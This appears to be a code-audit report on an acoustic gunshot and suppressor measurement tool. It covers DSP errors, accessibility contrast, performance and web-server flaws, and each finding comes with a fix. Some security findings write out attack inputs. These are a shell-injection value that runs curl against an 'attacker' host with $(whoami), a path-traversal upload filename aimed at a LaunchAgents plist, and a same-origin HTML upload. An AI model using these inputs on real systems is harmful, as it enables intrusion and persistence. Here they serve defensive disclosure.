**Fix:** Build history items with document.createElement and `el.dataset.path = entry.path` instead of a template string — that removes the attribute-context entirely and is a small, local change to app.js:565-596. Best combined with the opaque-id change from api-image-arbitrary-file-read so paths never reach the client at all. If templating is kept, extend esc() with `.replace(/"/g,'&quot;').replace(/'/g,'&#39;')`.


### The headline metrics show a single-shot maximum and bare means, discarding the standard deviations the backend computes

`ui/renderer/app.js:247` · UI & Presentation

```python
const cards = [
      { cls: 'peak', label: 'Peak SPL (Z)', value: formatDb(agg.Lpeak_Z_max), unit: 'dB' },
      { cls: 'rms',  label: 'LAFmax (mean)', value: formatDb(agg.LAFmax_mean), unit: 'dB' },
      { cls: 'sel',  label: 'LAE (mean)', value: formatDb(agg.LAE_mean), unit: 'dB' },
      { cls: 'shots', label: 'Shots Detected', value: meta.n_shots ?? '—', unit: '' },
    ];
```

**Failure:** main.py:841-843 already prints `LAE mean: X ± Y` and `LAFmax mean: X ± Y` from aggregate.LAE_std / LAFmax_std, and the values are in analysis_metadata.json. The UI shows means with no dispersion and promotes `Lpeak_Z_max` — the single loudest shot of the string, the least robust possible estimator — to the largest number on the screen in warning orange. A 10-shot string where one shot caught a bolt-slap transient reports a headline peak 6 dB above the string's true central value, and a suppressor is judged on that outlier. Nothing shows n, spread, or which shot produced the max.

**Fix:** Add a subline to each aggregate card reading 'mean +/- SD (n=N)' from agg.LAE_std / agg.LAFmax_std / meta.n_shots — a purely client-side change to renderMetrics. Keep Lpeak_Z_max as the peak headline but add mean peak and the shot number that produced the max underneath (both derivable from agg.shots). The sparkline and 2-SD outlier flag are worthwhile follow-ons, not the core fix.


### Primary action button label is 3.68:1 — the single most important control in the app fails WCAG AA

`ui/renderer/styles.css:519` · UI & Presentation · WCAG 2.2 SC 1.4.3 Contrast (Minimum)

```python
.btn-run {
  ...
  background: var(--accent);
  color: white;
  font-size: 15px;
  font-weight: 600;
```

**Failure:** #FFFFFF (L=1.0000) on --accent #3b82f6 (L=0.2355) gives (1.05)/(0.2855) = 3.68:1. At 15px/600 this is normal-size text requiring 4.5:1, so it fails SC 1.4.3. In bright range daylight on a laptop screen the "Run Analysis" label washes out against the blue fill. The same pair recurs on `.shot-pill.active` (styles.css:789-793) at 12px, where the active shot number — the only indicator of which shot's metrics are on screen — is also 3.68:1.

**Fix:** Keep white but darken the accent to about #1B6FA8 (5.4:1 with white), or invert as proposed with a light accent #6FB4E8 plus a near-black #08111A label. Apply the same change to .shot-pill.active so the active shot indicator inherits it. Adjusting --accent alone fixes both call sites since neither hardcodes a hex.


### --border #1e1e2a is 1.13:1 against card fill and 1.21:1 against the page — the panel and input boundaries that structure the whole UI cannot be seen

`ui/renderer/styles.css:16` · UI & Presentation · WCAG 2.2 SC 1.4.11 (component boundaries)

```python
--border: #1e1e2a;
  --border-subtle: #16161f;
  --border-focus: #3b82f6;
```

**Failure:** #1e1e2a has L=0.013709. Against --bg-card #12121a (L=0.006362) the ratio is 1.13:1; against --bg-root #08080c it is 1.21:1. `.form-input`/`.form-select` (styles.css:432-443) are identified ONLY by this border plus a --bg-input #0c0c12 fill that is itself 1.07:1 against the card — so the numeric entry fields for threshold, refractory, pre/post window and calibration have no perceivable boundary. An operator cannot see where a field starts, which is why the layout reads as a flat black sheet of floating text rather than an instrument panel. `--border-focus` is declared and never used anywhere in the codebase.

**Fix:** Split the token: keep a low-contrast hairline for decorative rules and add a stronger token (>=3:1 against the panel fill, e.g. ~#5C7185) applied to .form-input/.form-select, .btn-secondary, .shot-pill, .metric-card, .table-container and .file-drop. Delete --border-focus or wire it into the :focus rule at styles.css:444.


### The stylesheet contains exactly one :focus rule, paired with outline:none, and the file input's focus indicator is inside an opacity:0 element

`ui/renderer/styles.css:442` · UI & Presentation · WCAG 2.2 SC 2.4.7 Focus Visible; SC 2.4.11 Focus Not Obscured

```python
transition: border-color 0.15s var(--ease);
  outline: none;
}
.form-input:focus, .form-select:focus {
  border-color: var(--accent);
  box-shadow: 0 0 0 3px var(--accent-glow);
}
```

**Failure:** `grep -c ':focus-visible' styles.css` = 0. `outline:none` removes the UA ring on all inputs and selects; the replacement is a border colour change plus a box-shadow of `rgba(59,130,246,0.15)` — a 15%-alpha blue over a near-black surface, which composites to roughly #14181F and is not perceivable. Separately, index.html:71 places the real `<input type="file">` inside `.file-drop` with `opacity: 0` (styles.css:308-313): a keyboard user tabbing into the app lands on the file input first and sees absolutely no indication of focus, because the focused element is fully transparent. The primary entry point of the application is unreachable by keyboard in practice.

**Fix:** Add `.file-drop:focus-within { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(59,130,246,0.35); }` plus an aria-label on the input at index.html:71 — that is the actual repair, since the invisible file input is the only element with no focus expression at all. Then add the global `:where(a,button,input,select,textarea,[tabindex]):focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }` so the ring survives future `outline:none` additions, and strengthen the input focus ring alpha. Do not bother rewriting the input focus indicator wholesale; it already works.


### Success and error toasts differ only by border colour — no icon, no text prefix, no role

`ui/renderer/styles.css:992` · UI & Presentation · WCAG 2.2 SC 1.4.1 Use of Color

```python
.toast.success { border-color: var(--success); }
.toast.error { border-color: var(--danger); }
```

**Failure:** The only difference between 'Copied' and 'Upload failed: ENOENT' is a 1px border of #22c55e vs #ef4444. A red/green colour-deficient operator (about 8% of men, and this is a defense/range product with a heavily male user base) cannot distinguish a successful copy from a failed upload. The toast auto-dismisses after 3 s (app.js:608), so a failure the user glances away from is gone permanently with no log. Multiple toasts are all positioned `bottom:24px; right:24px` (styles.css:979-981) and therefore stack exactly on top of each other — three rapid errors render as one unreadable pile.

**Fix:** Add a text/glyph prefix per type so the distinction is not colour-borne, give errors role="alert" and successes role="status", make error toasts persist until dismissed (keep the 3 s auto-dismiss for success), and wrap toasts in a fixed flex-column container so multiples stack instead of overlapping. The 'Notifications panel' is optional.


### Status hues are spent as decoration, leaving no colour vocabulary for actual status — and the running state is coloured 'danger' red

`ui/renderer/styles.css:544` · UI & Presentation

```python
.btn-run.running {
  background: var(--danger);
  animation: pulse-glow 2s infinite;
}
```

**Failure:** --danger #ef4444 marks a perfectly normal in-progress run, --success #22c55e is the decorative accent for the neutral 'Shots Detected' count (styles.css:664, 683), and --metric-peak #f97316 (a warning orange) simply means 'peak'. So when something genuinely IS wrong — clipped samples, zero shots detected, uncalibrated input — the interface has no unclaimed colour left to signal it, and in fact currently signals nothing at all. Operators learn that red means 'busy', which is exactly the wrong reflex on a hazard-measurement tool. The 2 s pulse-glow animation also violates the calm-instrument goal and ignores prefers-reduced-motion (no such media query exists in the file).

**Fix:** Move the running state off --danger to the neutral accent with a determinate progress bar. Reserve amber/red exclusively for measurement-validity signalling once the validity checks exist. Add `@media (prefers-reduced-motion: reduce)` disabling the pulse and the view transitions. De-hueing the four metric cards is a judgement call, not a defect fix — do it as part of the design-system work, not as a separate change.


### Uploads are stored under attacker-chosen filenames and /api/image serves .html as text/html from the app origin

`ui/server.js:53` · UI & Presentation

```python
'.html': 'text/html',
```

**Failure:** The `accept` attribute in index.html:71 is client-side only; multer accepts any file. POST /api/upload with originalname `pwn.html` writes Audio/uploads/pwn.html verbatim (server.js:31-40 preserves originalname). GET /api/image?dir=<uploads>&file=pwn.html then serves it as text/html on http://localhost:3847 — same origin as the app. The injected script inherits the origin and can drive the WebSocket at server.js:160 to run analyses with an arbitrary `outputDir`, and exfiltrate any file via /api/image.

**Fix:** Remove '.html' and '.svg' from MIME_MAP and serve the Plotly HTML through a dedicated endpoint that is hard-scoped to the analysis root and rendered in a sandboxed iframe (`sandbox="allow-scripts"`, no allow-same-origin) in app.js:279. Add a multer fileFilter restricted to the index.html:71 extension list, and store uploads under a generated name with the display name kept in metadata.


### multer diskStorage writes file.originalname unsanitised — path separators in the name escape the upload directory

`ui/server.js:31` · UI & Presentation

```python
filename: (req, file, cb) => {
      // Avoid collisions: prefix with timestamp if file already exists
      let name = file.originalname;
      if (fs.existsSync(path.join(UPLOAD_DIR, name))) {
```

**Failure:** multer 1.x explicitly does not sanitise `originalname`; it does `path.join(destination, filename)`. A crafted multipart request with `filename="../../../../Users/graham/Library/LaunchAgents/x.plist"` writes outside Audio/uploads. Because the server also binds 0.0.0.0 (server.js:196), a LAN peer can do this. Even benignly, a filename containing `/` on macOS or `..\` on Windows produces an ENOENT that surfaces to the user only as a generic "Upload failed" toast.

**Fix:** `const name = path.basename(file.originalname).replace(/[^A-Za-z0-9._-]/g,'_');` then prefix with a UUID or timestamp unconditionally (the current existsSync-then-rename at server.js:34-38 is also racy under concurrent uploads). Add `limits: { fileSize: <configured max>, files: 1 }` and a `fileFilter` restricted to the extensions in index.html:71, and surface the resulting 413/415 as a real error state rather than the generic toast at app.js:62.


### No upload size limit and no temp-file cleanup — every uploaded recording is retained forever inside a cloud-synced folder

`ui/server.js:28` · UI & Presentation

```python
const upload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_DIR),
```

**Failure:** No `limits` option means multer streams a request of any size to disk. UPLOAD_DIR is `<repo>/Audio/uploads` (server.js:19) which for this checkout lives inside a Google Drive-synced directory, so every uploaded gunshot recording is silently replicated to the cloud, and nothing ever deletes them. A day of range testing (20 × 4 GB 192 kHz multitrack WAVs) permanently consumes 80 GB of Drive quota; a single malicious POST fills the volume.

**Fix:** Add `limits: { fileSize: <configured max> }` with an explicit 413 handler surfaced in the UI. Write uploads to os.tmpdir() (or an OS app-data dir) rather than inside the repo so they are never cloud-synced. Add a startup sweep deleting uploads older than N days and a 'Clear uploads' action in the Results/Settings area reporting bytes reclaimed.


### No DC-offset removal and no infrasonic band-limiting before Z-weighted levels; Z-weighting is a bare pass-through

`weighting.py:308` · Weighting & Calibration · IEC 61672-1:2013 §5.4.5 and Table 2 (Z-weighting is defined over a stated bandwidth with tolerance limits, not as an unbounded pass-through)

```python
def apply_z_weight(x: np.ndarray, fs: float) -> np.ndarray:
    ...
    return np.asarray(x, dtype=np.float64).copy()   # weighting.py:297-308

    x_z = apply_z_weight(x, sample_rate)              # Z = unweighted (pass-through)   # metrics.py:461

        return np.asarray(samples, dtype=np.float64) * self.Pa_per_FS   # calibration.py:156
```

**Failure:** Nothing anywhere subtracts a mean or high-passes: a repo grep for detrend/high-pass/DC finds only bands.py's per-band Butterworth (bands.py:110) and the A-weighting docstring. calibration.py:156 multiplies raw samples straight to Pascals, and calibration.py:222 computes RMS without mean removal. Concrete: a 0.5% full-scale DC offset (routine on cheap USB/prosumer interfaces and on audio pulled out of video files via ExtractAudio.py) at the default 143.96 Pa/FS is a constant 0.72 Pa, i.e. a 91 dB pedestal added to the pressure waveform. Lpeak_Z (metrics.py:466) reads the peak of |x + 0.72|, which biases the peak upward for one polarity, and — worse — compute_b_duration measures time spent within 20 dB of the peak against a baseline that is no longer zero, so B-duration is inflated for the quiet suppressed shots where it matters most; crest factor and kurtosis are likewise computed on an offset signal. Separately, gunshot recordings carry enormous sub-20 Hz energy (muzzle-blast overpressure tail, wind buffet on an unscreened mic, handling/tripod thump). Because Z is a literal pass-through with no band limit, all of that lands directly in Lpeak_Z, LZE and LZFmax/LZImax — the very numbers used as the headline suppressor peak. 10 Pa of sub-5 Hz wind buffet riding on a 200 Pa shot inflates Lpeak_Z by 20*log10(210/200) = 0.42 dB, and on a quiet suppressed 20 Pa shot by 3.5 dB. IEC 61672-1 Z-weighting is specified flat only across a stated bandwidth (nominally 10 Hz to 20 kHz) with defined roll-off outside it — a real SLM has that band limit; this code has none.

**Fix:** Two separable changes. (1) Estimate DC from a pre-shot quiet region (not the shot window) and subtract it before cal.to_pascals(); report the measured offset in FS and its dB SPL equivalent as a QA field. (2) Implement Z as an actual band-limited response - a low-order high-pass near 10 Hz replacing the pass-through at weighting.py:308 - and document the analysis bandwidth on every plot and in the report. Add a per-shot QA metric for the fraction of Z-weighted energy below 20 Hz with a warning threshold, which is what actually catches wind-contaminated takes. Quantify the DC consequence honestly in any writeup: it is ~0.03 dB on a 140 dB shot, ~0.3 dB on a 20 Pa suppressed shot.


## Low (24)


### compute_stft scaling='power' is +28.3 dB and scaling='density' is +30.1 dB wrong (missing FFT-length normalisation and the one-sided x2)

`STFT.py:151` · Bands & Spectral

```python
elif scaling == 'power':
        frames_windowed = frames * win_power[None, :]
        X = np.asarray(rfft(frames_windowed, axis=1))
        magnitude = np.abs(X) ** 2
    elif scaling == 'density':
        ...
        df = sample_rate / nperseg
        magnitude = np.abs(X) ** 2 / df
```

**Failure:** win_power = win/sqrt(sum(win**2)) normalises the WINDOW but nothing normalises the DFT itself, so |X|^2 is N times a power, and the one-sided x2 that the 'amplitude' branch applies is missing here entirely. Verified against scipy.signal.welch with the identical window, nperseg=2048 and noverlap=1536, on a 94 dB 1500 Hz tone at fs=48000: compute_stft(..., scaling='power') peak bin = 685.577 vs scipy scaling='spectrum' 1.00475, a ratio of 682.33 = +28.34 dB; compute_stft(..., scaling='density') peak bin = 29.2513 vs scipy scaling='density' 0.0285797, a ratio of 1023.5 = +30.10 dB = exactly 10*log10(nperseg/2). Any caller of this documented public API who selects these scalings gets a number ~1000x too large. The 'density' branch also divides by df = fs/nperseg rather than by the window noise bandwidth fs*sum(w^2)/sum(w)^2, so it is additionally wrong by the ENBW factor. The docstring at STFT.py:90 further mislabels 'power' as 'Power spectral density (units^2)'.

**Fix:** Either fix or delete the two dead branches. If fixing: 'power' -> magnitude = 2*|rfft(frames*win)|**2 / np.sum(win)**2 with DC and Nyquist halved; 'density' -> 2*|rfft(frames*win)|**2 / (sample_rate * np.sum(win**2)) with DC and Nyquist halved. Correct the STFT.py:90 docstring to 'one-sided power spectrum (units^2 per bin)'. Add a welch comparison test to 0.05 dB. Deleting them is equally acceptable given zero internal users.


### as_strided applies the input array's strides to a freshly padded copy; a non-contiguous input silently produces a completely wrong spectrum

`STFT.py:134` · Bands & Spectral

```python
strides = (x.strides[0] * hop, x.strides[0])

    # Ensure we don't exceed array bounds
    x_padded = np.pad(x, (0, max(0, (n_frames - 1) * hop + nperseg - len(x))))
    frames = np.lib.stride_tricks.as_strided(x_padded, shape=shape, strides=strides)
```

**Failure:** strides is read from x but as_strided is applied to x_padded, which np.pad always returns C-contiguous with itemsize strides. If the caller passes a non-contiguous float64 view, x.strides[0] is 16 (or larger) while x_padded's is 8, so the frames read every other sample -- an undetected 2x resampling. Verified: for a 1000 Hz sine at fs=48000, compute_stft on the contiguous array puts the peak at 1007.81 Hz, while compute_stft on a numerically identical non-contiguous view puts it at 1992.19 Hz, with no error raised. Trigger in practice: any caller doing compute_stft(data[:, 0], sr) on an interleaved 2-D array from sf.read(always_2d=True) (both WavLoader and STFT.load_wav produce such arrays), or passing a decimated view x[::2]. The output is a plausible-looking but entirely wrong spectrogram.

**Fix:** Replace the as_strided block with `frames = np.lib.stride_tricks.sliding_window_view(x_padded, nperseg)[::hop]`, which derives strides from the array it is handed and cannot go stale. If as_strided is kept for any reason, compute strides from x_padded AFTER padding and force `x = np.ascontiguousarray(x, dtype=np.float64)` at STFT.py:99.


### Hann scalloping makes a tonal component read up to 1.42 dB low, with no correction and no low-scalloping window offered

`STFT.py:115` · Bands & Spectral

```python
win = get_window(window, nperseg)
```

**Failure:** Verified: a 94.000 dB sine placed exactly halfway between bins (1511.71875 Hz at fs=48000, nperseg=2048) reports a maximum bin level of 92.578 dB, -1.422 dB -- the Hann worst-case scalloping loss. Suppressor bore and can resonances are narrowband and will land at arbitrary frequencies, so any tonal peak level read off the spectrogram carries a 0 to -1.42 dB unstated bias that varies from shot to shot. WINDOW_TYPES (STFT.py:43) offers only hann/hamming/blackman/rectangular; no low-scalloping window is available.

**Fix:** Add 'flattop' to get_window (STFT.py:46-67) and WINDOW_TYPES for tonal-amplitude readout, and add three-point parabolic peak interpolation as a helper for reading tone levels. Note that flattop widens the main lobe, so it is a readout option, not a new default. Fix this after stft-spectrogram-not-a-level - a 1.4 dB scalloping bias is irrelevant while the same figure carries a 29 dB window-size dependence.


### compute_band_exposure's single-frame branch uses half the hop as the frame duration, giving a -3.01 dB SEL error

`bands.py:359` · Bands & Spectral · IEC 61672-1:2013 clause 3.10 (sound exposure level).

```python
# Single frame: exposure = level x assumed frame duration.
        # Use the hop duration implied by time_s[0] as best estimate.
        frame_dt = float(time_s[0]) if len(time_s) > 0 else 1.0
```

**Failure:** compute_levels builds its axis as time_axis = (arange(n_frames)*hop + hop//2)/fs (bands.py:292), so time_s[0] is HALF the hop, not the hop. Verified: compute_band_exposure(np.array([[100.0]]), np.array([0.005])) returns 76.9897 dB; the correct answer for a 100 dB band level held over the 10 ms hop that frame represents is 100 + 10*log10(0.010) = 80.00 dB. Every single-frame band SEL is 3.01 dB low. This branch is reached whenever an analysis window is shorter than 2 hops -- with hop_ms=10.0 hardcoded at metrics.py:509 and main.py:656/930, that is any window under 20 ms, e.g. a user-tightened per-shot window. The len(time_s)==0 fallback is worse: frame_dt defaults to 1.0 s, a +20 dB error at hop_ms=10.

**Fix:** Return hop_ms in the results dict from compute_levels (analyze() already carries it at bands.py:330) and pass hop_s explicitly into compute_band_exposure, using energy = band_Pa2[:,0] * hop_s. Do not bother special-casing len(time_s)==0 as a +20 dB bug; just raise ValueError on mismatched array lengths.


### Band level sampled at the END of each hop window but labelled at the window CENTRE, and the trailing partial hop is discarded

`bands.py:284` · Bands & Spectral

```python
decimate_indices = np.arange(hop_samples - 1, hop_samples * n_frames, hop_samples)
...
        time_axis = (np.arange(n_frames) * hop_samples + hop_samples // 2) / self.sample_rate
```

**Failure:** The Fast/Slow branch samples the exponential detector at index hop_samples-1 within each hop (the last sample of the window) but the axis places that value at hop_samples//2 (the centre) -- a fixed +hop/2 timing bias, 5 ms at the hop_ms=10.0 hardcoded in main.py:656, main.py:930 and metrics.py:509. The 'none' branch by contrast averages over the window and IS correctly centred, so the two weightings disagree by 5 ms on identical data. Separately, n_frames = len(x)//hop_samples (bands.py:238) discards up to hop_samples-1 trailing samples, so on a per-shot window ending 9 ms after the last full hop that energy never enters compute_band_exposure and the per-band SEL is under-reported.

**Fix:** Sample the Fast/Slow detector at hop_samples//2 within each hop so it matches the 'none' branch and the existing centred time axis (one-line change to bands.py:284). Change n_frames to ceil(len(x)/hop_samples) and divide the final short window by its actual length in the 'none' branch. Fix this together with the group-delay compensation, not before it.


### Z- and C-weighted spectrograms recompute the entire STFT from scratch, doubling a 1.3 GB O(N log N) pass for a post-FFT vector multiply

`main.py:891` · Bands & Spectral

```python
stft_z_full = analyze_stft(pressure_Pa, sr, nperseg=config.nperseg,
                               noverlap=config.noverlap, weighting='Z')
...
    stft_c_full = analyze_stft(pressure_Pa, sr, nperseg=config.nperseg,
                               noverlap=config.noverlap, weighting='C')
```

**Failure:** compute_stft_dB_SPL applies the weighting at STFT.py:208-219, i.e. AFTER the FFT, as a per-frequency multiply on the already-computed magnitude, so computing it twice buys nothing. Measured cost at fs=192000 over 60 s with nperseg=2048 and 75% overlap: 22,497 frames, frames_windowed 0.37 GB + rfft output 0.37 GB + magnitude/dB arrays 0.55 GB = about 1.29 GB peak per call, done twice sequentially (and again per shot at main.py:693-694, and again inside compute_spectrogram_pair at STFT.py:334-335). On a 120 s file that is about 2.58 GB per call.

**Fix:** Split compute_stft_dB_SPL into a magnitude pass and a weighting pass, and add a variant of analyze_stft that accepts a tuple of weightings and returns a dict of STFTResult from one FFT. In the chunked path this also removes a second full-file disk read. Claim the saving as roughly halved runtime for the spectrogram stage; do not claim halved peak memory, since the existing del/gc already serialises the allocations.


### Falsy config checks in the web bridge silently replace a user-entered 0 with the built-in defaults

`app.py:791` · Shot Detection & Sampling

```python
if config.get('thresholdDb'):
                ac_kwargs['detection_threshold_dB'] = float(config['thresholdDb'])
```

**Failure:** A user who sets the threshold field to 0 to 'detect everything' has that value discarded by the truthiness test and gets the 120 dB default instead — typically producing zero detections on a low-gain recording, with the log line reading "Detection threshold: 120.0 dB SPL" and no indication that the entered value was ignored. The same pattern applies at app.py:781 (paPerFS), 793 (refractoryMs), 795 (preMs) and 797 (postMs); ui/renderer/app.js:170-173 compounds it with `parseFloat(...) || 120`, which also maps 0 to the default before the value is ever sent.

**Fix:** Use presence tests on the Python side (`if config.get('thresholdDb') is not None:`) and Number.isFinite on the JS side, then echo the effective AnalysisConfig back over the WebSocket and render it in the run log so the operator can confirm exactly what was used. Separately, validate ranges (threshold within [40, 200] dB, refractory > 0) and reject out-of-range entries with a visible message rather than silently defaulting.


### README's clone URL and Releases link point at a GitHub org that is not the actual remote

`README.md:104` · Engineering Quality

```python
git clone https://github.com/ridgeback-defense/SASA.git
```

**Failure:** `git remote -v` reports `origin https://github.com/gmwilson34/SASA.git`. README.md:104 tells users to clone `github.com/ridgeback-defense/SASA.git` and README.md:124 links to `https://github.com/ridgeback-defense/SASA/releases` for the binaries. Neither path corresponds to the repo the CI workflow publishes to. A new engineer following the README gets `remote: Repository not found` (or, worse, lands on some unrelated org's repo if that name is ever registered), and a customer following the Releases link finds a 404 instead of the .zip artifacts that build.yml:52 and 98 actually upload.

**Fix:** Point both README.md:104 and README.md:124 at github.com/gmwilson34/SASA, or complete the org move first and update the git remote. A CI link-checker is optional overhead for two URLs; a one-line grep asserting the README URL matches `git remote get-url origin` is cheaper.


### WavLoader's CLI indexes time_s[-1] with no length check, crashing on a zero-frame WAV

`WavLoader.py:155` · Engineering Quality

```python
print(f"Duration: {wav_data.time_s[-1]:.3f} s")
```

**Failure:** A zero-length but structurally valid WAV (a recorder that was armed and stopped instantly, or an ffmpeg extraction from a video whose audio track is empty) yields `data.shape[0] == 0`, so `time_s = np.arange(0)` is empty and line 155 raises `IndexError: index -1 is out of bounds for axis 0 with size 0` — an unhandled traceback instead of 'Duration: 0.000 s'. Note the value is also wrong even for non-empty files: time_s[-1] is (n-1)/sr, not n/sr, so a 1.000 s file at 48 kHz reports 0.99998 s. Separately, the `--save-npy` branch at lines 158-175 has two identical if/else arms (both call np.savez with the same three arguments), so the ndim check is dead code.

**Fix:** Replace WavLoader.py:155 with `wav_data.samples.shape[0] / wav_data.sample_rate`, which fixes both the crash and the off-by-one, and collapse WavLoader.py:160-175 to one np.savez call. Skip the proposed 'raise ValueError on zero frames in load_wav' — that would change behavior for the analysis path on a legitimately empty-but-valid capture; a warning is sufficient.


### --dtype is undocumented in the README and unreachable from the GUI, so 32-bit PCM sources are always truncated to a 24-bit mantissa

`main.py:1054` · Engineering Quality

```python
analysis_group.add_argument("--dtype", type=str, default="float32",
                                choices=["float32", "float64"],
                                help="Sample dtype when loading WAV: float32 (default) or float64 for full 32-bit precision")
```

**Failure:** Two problems. (a) README's CLI reference tables (README.md:670-698) list all fourteen other flags — --Pa-per-FS, --sensitivity-mV, --V-per-FS, --cal-desc, --threshold-dB, --refractory-ms, --pre-ms, --post-ms, --nperseg, --no-bands, --no-per-shot, -o/--output, --config, --formats — but --dtype appears nowhere (`grep -n dtype README.md` finds only an unrelated code sample at line 775). It is the one real flag with no documentation. (b) Neither UI bridge passes it: `grep -n 'dtype\|loadDtype' app.py ui/renderer/app.js` returns nothing, so the frozen desktop app — the primary delivery vehicle — always loads float32. For a PCM_32 (32-bit integer) WAV, soundfile's float32 conversion discards 8 mantissa bits, raising the numerical floor to roughly -145 dBFS. Peak SPL is unaffected at that precision, but the low-level decay tail used for B-duration and the LAE integration tail are quantized more coarsely than the recorder captured. The help text's claim of 'full 32-bit precision' is also misleading for float32 sources, where the two settings are bit-identical because calibration.py:156 upcasts to float64 regardless.

**Fix:** Prefer the auto-select over exposing the flag: read sf.info(path).subtype in analyze_file and use float64 when the subtype is PCM_32 or DOUBLE, float32 otherwise, then record both the subtype and the chosen dtype in analysis_metadata.json. Document the flag in README.md's Analysis table if it is kept, and reword the help text to say it affects the low-level decay floor, not peak accuracy.


### ui/package.json pins multer 1.x, which is end-of-life and carries known DoS advisories

`ui/package.json:13` · Engineering Quality

```python
"multer": "^1.4.5-lts.1",
```

**Failure:** multer 1.x has been deprecated by its maintainers in favour of 2.x specifically because of unpatched denial-of-service advisories in the 1.x line (malformed multipart requests and unhandled busboy errors that crash the process). `npm install` in ui/ therefore produces an npm audit finding on a fresh checkout, and build_macos.sh:51 runs that install as part of the release build. Because ui/server.js binds a port and accepts file uploads, a malformed multipart POST to localhost:3847 can terminate the analysis server mid-run. There is also no Dependabot config and no `npm audit` step in CI, so this will not surface on its own.

**Fix:** Deleting the Node server (see readme-node-ui-contradiction) is the correct fix and removes the dependency entirely. If it is kept, bump to multer ^2.0.0, refresh package-lock.json, and bind ui/server.js:196 to 127.0.0.1 explicitly — the unbound listen is the more directly exploitable half of this. Dependabot/npm audit in CI is reasonable either way.


### Both exponential-average detectors are per-sample Python loops, run 6x per shot; ~40 ms/shot at 192 kHz and 160 ms/shot for a 1 s window

`metrics.py:168` · Acoustic Metrics

```python
state = 0.0
    for i in range(n):
        state = alpha * x_squared[i] + (1.0 - alpha) * state
        y[i] = state
```

**Failure:** compute_shot_metrics runs compute_time_weighted_levels twice (metrics.py:478-479), each of which runs compute_exponential_average twice (Fast + Slow, metrics.py:417-418), plus two compute_impulse_exponential_average calls (metrics.py:490-491) — six per-sample Python loops over the whole window for every shot. Measured wall time for those six loops: 9.9 ms/shot at 48 kHz/250 ms, 20.5 ms at 96 kHz/250 ms, 39.6 ms at 192 kHz/250 ms, 160.5 ms at 192 kHz/1000 ms. A 100-round 192 kHz session with a 1 s analysis window spends 16.1 s in these loops alone, and it scales linearly with both round count and sample rate. It also makes the detectors the dominant cost of the per-shot path, discouraging the longer analysis windows that the SEL finding calls for.

**Fix:** Replace compute_exponential_average's loop body with scipy.signal.lfilter([a],[1.0,-(1.0-a)], x_squared) where a = 1.0-np.exp(-1.0/(sample_rate*time_constant)) — bit-for-bit equivalent (verified) and 27x faster. Use lfilter's zi to initialise from ambient, which also closes the zero-initialisation finding in the same edit. compute_impulse_exponential_average should not be optimised in place: it should be replaced with the correct IEC two-stage topology (lfilter + decay-limited hold), which is vectorisable and makes the asymmetric branch unnecessary. Do the same for bands.py:249-263, which runs an equivalent per-sample loop over every band.


### README promises a `levels_full.png` artefact the pipeline never produces

`README.md:733` · Pipeline & I/O

```python
├── levels_full.png                # LAF/LAS/LZF/LZS time curves
```

**Failure:** A customer following the documented output manifest looks for the time-history of LAF/LAS/LZF/LZS — the curves that justify the reported LAFmax/LASmax — and finds no such file; grep confirms nothing in main.py or plots.py ever writes `levels_full`. The metric that most needs a visual audit trail has none.

**Fix:** Cheapest correct action is to delete the line from README.md:733. If the plot is wanted, it is a per-shot artefact (the series are computed per shot window, not for the whole file), so implement it as an additional panel in create_shot_summary_figure or as shots/shot_NN_levels.png rather than as a file-level levels_full.png — the README entry as written promises something the architecture does not produce.


### Per-shot images are matched to metrics by sorted filename, which mis-pairs above 99 shots

`app.py:590` · Pipeline & I/O

```python
shot_images = sorted(f.name for f in shots_dir.iterdir() if f.suffix == '.png')
```

**Failure:** `save_figure(fig_shot, shot_dir / f"shot_{shot.shot_number:02d}_summary")` (main.py:963) pads to two digits, but `max_shots` is 1000. On a 120-round endurance string, sorted() orders shot_100 before shot_11 ('0' < '1'), so the UI's positional pairing at app.js:357 shows shot 100's summary plot when the operator selects shot 11.

**Fix:** Change both format strings to `{:04d}` and, more robustly, have app.js match on the shot number parsed from the filename (or on an explicit image filename recorded per shot in analysis_metadata.json) rather than on list position. Note existing output directories keep the old naming, so the parse-based match is the fix that also repairs old runs.


### History list is sorted reverse-alphabetically by directory name, not chronologically

`app.py:549` · Pipeline & I/O

```python
for d in sorted(ANALYSIS_DIR.iterdir(), reverse=True):
```

**Failure:** Directory names are `{input_stem}_{YYYYmmdd_HHMMSS}`, so sorting the path string sorts by input filename first. Today's analysis of "Alpha_suppressed.wav" appears below last year's "Zulu_baseline.wav", and the operator opens the wrong (older) run. The Node implementation this file replaced sorted correctly on `meta.timestamp` (ui/server.js:82), so this is a regression in the Python rewrite.

**Fix:** Collect entries first, then `entries.sort(key=lambda e: e['meta'].get('timestamp', ''), reverse=True)` before _send_json — matching the Node implementation. Falling back to the directory mtime when timestamp is missing makes it robust for hand-copied directories.


### Legacy Node server passes an env-derived URL through a shell

`ui/server.js:209` · Pipeline & I/O · CWE-78

```python
exec(`${cmd} ${url}`);
```

**Failure:** `url` is built from `process.env.SASA_PORT` with no validation (ui/server.js:18). `SASA_PORT='3847 & curl attacker/$(whoami)'` makes `exec` run the injected command through /bin/sh. The same file also duplicates the Python server's endpoints with the same unrestricted `dir` parameter (ui/server.js:137-156) and never calls PythonBridge.cancel(), so it drifts from app.py while remaining runnable per the README's "Web UI" instructions.

**Fix:** Use `execFile(cmd, [url])` and coerce PORT with `const PORT = Number(process.env.SASA_PORT) || 3847` plus a 1024-65535 range check. The higher-value action is deciding this file's fate: sasa.spec bundles only ui/renderer (line 31) and app.py (line 97), so server.js and bridge/ ship with nothing — either delete them or mark them unsupported in README.md so the two servers stop drifting.


### 12-inch-wide figures with 9-10pt fonts and bbox_inches='tight' produce inconsistent, sub-legible artwork at report column width

`plots.py:170` · UI & Presentation

```python
'font.size': 10,
        'axes.titlesize': 12,
        'axes.labelsize': 10,
        'xtick.labelsize': 9,
        'ytick.labelsize': 9,
```

**Failure:** figsize is (12,4)/(12,5)/(14,12) inches. Placed at a typical 6.5-inch document text width, a 12-inch figure is scaled by 0.54, so 9pt tick labels render at 4.9pt and 10pt axis labels at 5.4pt — below the ~7pt practical floor for printed technical figures. Additionally `bbox_inches='tight'` trims each figure to its own content extent, so the saved PNGs have different aspect ratios and effective scales; laying several side by side in a report gives mismatched type sizes across the page. plot_band_exposure also rotates ~30 band labels at 45 degrees at 9pt, which is illegible once scaled.

